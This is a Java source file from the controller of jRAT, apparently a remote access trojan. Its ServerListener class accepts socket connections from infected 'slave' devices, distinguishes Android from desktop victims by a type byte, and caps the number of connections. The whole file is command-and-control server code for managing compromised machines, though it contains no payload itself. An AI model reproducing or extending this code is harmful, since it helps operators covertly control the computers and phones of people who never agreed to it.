package io.jrat.controller.net;

import io.jrat.common.ConnectionCodes;
import io.jrat.common.Logger;
import io.jrat.controller.AbstractSlave;
import io.jrat.controller.LogAction;
import io.jrat.controller.Main;
import io.jrat.controller.Slave;
import io.jrat.controller.android.AndroidSlave;
import io.jrat.controller.settings.Settings;
import java.net.Socket;

public class ServerListener extends PortListener implements Runnable {

	public ServerListener(String name, int port, int timeout, String pass) throws Exception {
		super(name, port, timeout, pass, Settings.SocketType.SOCKET_NORMAL);
	}

	@Override
	public void run() {
		while (!server.isClosed()) {
			try {
				Socket socket = server.accept();

				try {
					int max = Settings.getGlobal().getInt(Settings.KEY_MAXIMUM_CONNECTIONS);

					if (max != -1 && Main.connections.size() > max) {
						Logger.log("Maximum connections reached (" + max + "), closing..."); // TODO warning
						socket.close();
						continue;
					}
				} catch (Exception ex) {
					ex.printStackTrace(); // TODO error message
				}

				int type = socket.getInputStream().read();

				AbstractSlave slave;

				if (type == ConnectionCodes.ANDROID_SLAVE) {
					slave = new AndroidSlave(this, socket);
				} else if (type == ConnectionCodes.DESKTOP_SLAVE) {
					slave = new Slave(this, socket);
				}

				if (type < 0 || type > 1) {
					slave = new Slave(this, socket);
					Main.instance.getPanelLog().addEntry(LogAction.ERROR, slave, "Invalid connection type");
					continue;
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
